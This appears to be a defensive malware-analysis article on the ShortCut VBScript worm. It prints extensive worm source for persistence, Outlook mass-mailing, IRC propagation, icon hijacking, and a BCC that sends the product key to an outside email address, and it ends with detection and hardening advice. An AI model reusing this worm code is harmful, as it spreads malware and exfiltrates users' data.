# Dissecting VBS/mIRC/Outlook.ShortCut.A: A 2000-Era Multi-Vector VBScript Worm 🛠️🔍

This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction

At the turn of the millennium, script-based malware thrived by abusing Windows Script Host (WSH), Microsoft Outlook automation, and popular chat clients like mIRC. VBS/mIRC/Outlook.ShortCut.A (“ShortCut” for short), attributed to “PetiK” in December 2000, is a compact yet ambitious worm that combines Outlook mass-mailing, mIRC DCC propagation, registry persistence, file association tampering, and light system vandalism. It even attempts basic data exfiltration via email.

While its tactics are dated and the code contains several bugs, ShortCut remains a valuable case study. It demonstrates how minimal code can weaponize default system components (COM, registry, file associations) to spread across social channels. This deep dive walks through the source, highlights design choices and logic flaws, and translates the lessons into modern detection and defense strategies.

---

## Section 1: Overview of the Malware 🧭

ShortCut is a VBScript worm targeting Windows 9x/Me/2000 environments with Outlook and optionally mIRC installed. Its operation hinges on “living off the land” by automating Outlook via COM to email itself to all address book entries and by rewriting `mIRC\script.ini` to DCC-send a copy to users joining IRC channels.

Key behaviors:
- Persistence: Writes a RunServices key pointing to a self-copied script under `%WINDIR%\SAMPLES\WSH\Shortcut.vbs`.
- Self-replication: Writes its own source into the Windows Samples WSH directory to masquerade as a legitimate example script.
- Email propagation: Mass-mails with subject “ShortCut for WINDOWS” and a self-attachment.
- IRC propagation: If mIRC is present, sends the worm to users on channel join events via DCC.
- Data exfiltration: Sends a BCC to `Panda34@caramail.com` containing the Windows Product Key and the IE Start Page.
- Aesthetics/Deception: Changes default icons for `.exe`, `.htm`, and `.hta` to the VBS icon to confuse users.
- System nuisance: Appends holiday-themed messages into `AUTOEXEC.BAT` on the 1st, 15th, and 30th.

Primary infection vectors are social: enticing email attachments and opportunistic DCC sends on IRC. The code also attempts to mark “done” state in the registry to avoid repeat mailing, though its implementation is flawed.

---

## Section 2: Source Code Analysis 💻

Below are the most relevant excerpts from `ShortCut.vbs` with commentary. Do not execute this code.

### Initialization and Persistence

```vb
' Read current script for self-replication
Set fso  = CreateObject("Scripting.FileSystemObject")
Set ws   = CreateObject("WScript.Shell")
Set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopie = file.ReadAll

' Copy self into Windows Samples path and persist via RunServices
Set win  = fso.GetSpecialFolder(0)
ShortCut = (win & "\SAMPLES\WSH\Shortcut.vbs")
Set inf  = fso.OpenTextFile(ShortCut, 2, true)
inf.Write vbscopie
inf.Close

ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\ShortCut", ShortCut
```

- Uses `FileSystemObject` and `WScript.Shell` for file/registry operations.
- Writes its entire source to `%WINDIR%\SAMPLES\WSH\Shortcut.vbs`.
- Creates a legacy `RunServices` value to auto-run on startup on Win9x/Me/2000-like systems.

It then tries to “brand” the system by forcing the RegisteredOwner:

```vb
id = ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
If (id <> PetiK) Then  ' BUG: PetiK should be a quoted string "PetiK"
	ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "PetiK"
End If
```

- Logic bug: Missing quotes around `PetiK` will raise an error. Intent is clear—set owner to “PetiK”.

### Outlook Mass Mailing + Data Exfiltration

```vb
id2 = ws.RegRead("HKLM\Software\")
If id2 <> "OK" Then
	Set OApp = CreateObject("Outlook.Application")
	if oapp = "Outlook" then  ' BUG: compares object to string; intended to guard Outlook availability
		Set Mapi = OApp.GetNameSpace("MAPI")
		For Each AddList In Mapi.AddressLists
			If AddList.AddressEntries.Count <> 0 Then
				For AddListCount = 1 To AddList.AddressEntries.Count
					Set AddListEntry = AddList.AddressEntries(AddListCount)
					Set msg = OApp.CreateItem(0)
					msg.To = AddListEntry.Address
					msg.Subject = "ShortCut for WINDOWS"
					msg.Body = "This is a good ShortCut for your computer"
					msg.Attachments.Add fso.BuildPath(fso.GetSpecialFolder(0), "\SAMPLES\WSH\Shortcut.vbs")
					If msg.To <> "" Then msg.Send
				Next
			End If
		Next
	End If

	' Exfiltrate environment info via BCC
	Set msg2 = OApp.CreateItem(0)
	msg2.BCC = "Panda34@caramail.com"
	nom = ws.RegRead("HKLM\software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
	CN = CreateObject("WScript.NetWork").ComputerName
	msg2.Subject = "Message de """ & nom & """ alias " & CN & ""
	page = ws.RegRead("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")
	PK = ws.RegRead("HKLM\software\Microsoft\Windows\CurrentVersion\ProductKey")
	msg2.Body = "-IE :  """ & page & """ -Produkt Key """ & PK & """"
	msg2.Send

	' Attempt to set a "done" flag (misplaced under HKLM\Software default value)
	ws.RegWrite "HKLM\Software\", "OK"
End If
```

Observations:
- Anti-repeat flag is written to the default value of `HKLM\Software`, which is not a reliable or appropriate place and may fail depending on permissions.
- The guard `if oapp="Outlook"` is incorrect. Proper checks would test `If Not OApp Is Nothing` or trap COM activation errors.
- Exfiltration via BCC includes Windows Product Key and IE start page—clear privacy concern and a rudimentary C2 channel.

### mIRC Propagation

```vb
If fso.FileExists("C:\mirc\script.ini") Then
	' Drop a copy to be sent
	Set c = fso.GetFile(WScript.ScriptFullName)
	c.Copy("C:\mirc\ShortCut.txt.vbs")

	' Overwrite mIRC script.ini to DCC send on channel join
	Set srpt = fso.CreateTextFile("C:\mirc\script.ini", true)
	srpt.WriteLine "[script]; " & win & "\Winmine.exe"
	srpt.WriteLine "n0=on 1:JOIN:#:{"
	srpt.WriteLine "n1= /if ( $nick == $me ) { halt }"
	srpt.WriteLine "n2= /.dcc send $nick C:\mirc\ShortCut.txt.vbs"
	srpt.WriteLine "n3=}"
	srpt.Close
End If
```

- Checks for a typical legacy mIRC path, then forces a script that sends the worm to anyone joining the channel, excluding self.
- Overwriting `script.ini` is destructive to user scripts and ensures persistence within IRC sessions.

### AUTOEXEC.BAT Vandalism

```vb
If Day(Now()) = 1 Or Day(Now()) = 15 Or Day(Now()) = 30 Then
	file = "c:\\autoexec.bat"
	Set autoexec = fso.OpenTextFile(file, 1, False, False)
	TLine = autoexec.Readall
	Set autobat = fso.CreateTextFile(file, True, False)
	autobat.Write tline
	autobat.WriteBlankLines(1)
	autobat.WriteLine "@echo off"
	autobat.WriteLine "cls"
	autobat.WriteLine "echo."
	autobat.WriteLine "echo VBS/mIRC/Outloock.ShortCut.A par PetiK"
	autobat.WriteLine "echo (c)2000"
	autobat.WriteLine "echo JOYEUX NOEL ET BONNE ANNEE"
	autobat.WriteLine "pause"
End If
```

- Appends festive text to `AUTOEXEC.BAT` on specific days—non-destructive but intrusive and attention-grabbing.

### File Association Hijacking (Icons)

```vb
AZE = ws.RegRead ("HKCR\VBSfile\DefaultIcon\")
ws.RegWrite "HKCR\exefile\DefaultIcon\", AZE
ws.RegWrite "HKCR\htmfile\DefaultIcon\", AZE
ws.RegWrite "HKCR\htafile\DefaultIcon\", AZE
```

- Copies the VBS icon to `.exe`, `.htm`, and `.hta` default icons to mislead users visually. Note: The function contains an extra `End If` in the original, suggesting copy-paste errors.

### Summary of Code Quality and Evasion

- No obfuscation: Plain VBScript; easy to statically analyze.
- Multiple logic/syntax issues likely reduce reliability on real systems.
- Living-off-the-land: COM, registry, mIRC scripts—no external packers.
- Rudimentary anti-repeat markers via registry—poorly implemented.
- C2-lite via email BCC; no dedicated network beaconing.

---

## Section 3: Mitigation and Defense Strategies 🛡️

Practical detection and containment steps for legacy and modern environments:

Detection (Host):
- Look for files and locations:
	- `%WINDIR%\SAMPLES\WSH\Shortcut.vbs`
	- `C:\mirc\ShortCut.txt.vbs`
	- Modified `C:\mirc\script.ini`
	- Modified `C:\autoexec.bat` with “JOYEUX NOEL ET BONNE ANNEE”
- Registry keys of interest:
	- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\ShortCut`
	- `HKCR\exefile\DefaultIcon\`, `HKCR\htmfile\DefaultIcon\`, `HKCR\htafile\DefaultIcon\` set to VBS icon path
	- `HKLM\...\RegisteredOwner` unexpectedly set to “PetiK”
- Email artifacts:
	- Sent items with subject “ShortCut for WINDOWS”
	- BCC to `Panda34@caramail.com` (exfil indicator)

Detection (Network):
- Outbound SMTP spikes from endpoints using Outlook COM automation.
- IRC/mIRC traffic with DCC SEND events referencing `ShortCut.txt.vbs`.

Prevention and Hardening:
- Disable or restrict Windows Script Host where not needed; use AppLocker/WDAC to block `.vbs` execution.
- Outlook hardening: Disable programmatic sending by untrusted code; enforce Protected View and attachment filtering (block `.vbs`, `.hta`, executables).
- mIRC hygiene: Avoid legacy clients; monitor `script.ini` integrity.
- Registry protection: Monitor and alert on startup locations and file association changes.
- Principle of Least Privilege: Non-admin users for daily work, reducing ability to write HKLM and HKCR.
- EDR rules: Flag combinations of mass email + registry startup write + mIRC script changes.

Response:
- Isolate host (network quarantine).
- Remove persistence keys; restore icon associations from clean baselines.
- Replace `script.ini` and `AUTOEXEC.BAT` from backups; review other autoruns.
- Forensically collect evidence (disk, memory, mail logs) before cleaning if investigation is needed.

---

## Conclusion

VBS/mIRC/Outlook.ShortCut.A embodies classic social-propagation techniques: email and IRC, backed by registry persistence and user deception through icon hijacking. Its code is simple and largely unobfuscated, yet capable of multi-channel spread and light data exfiltration. The numerous logic errors show how many early worms were rapidly authored and inconsistently tested—still, the design patterns persist in modern threats that automate email clients, tamper with associations, or exploit chat ecosystems for peer-to-peer spread.

By studying this script, defenders can better anticipate abuse of native automation interfaces and enforce controls that neuter entire classes of script-borne malware. Defense-in-depth—restricting script execution, hardening email clients, monitoring autoruns, and detecting suspicious automation—remains the best countermeasure.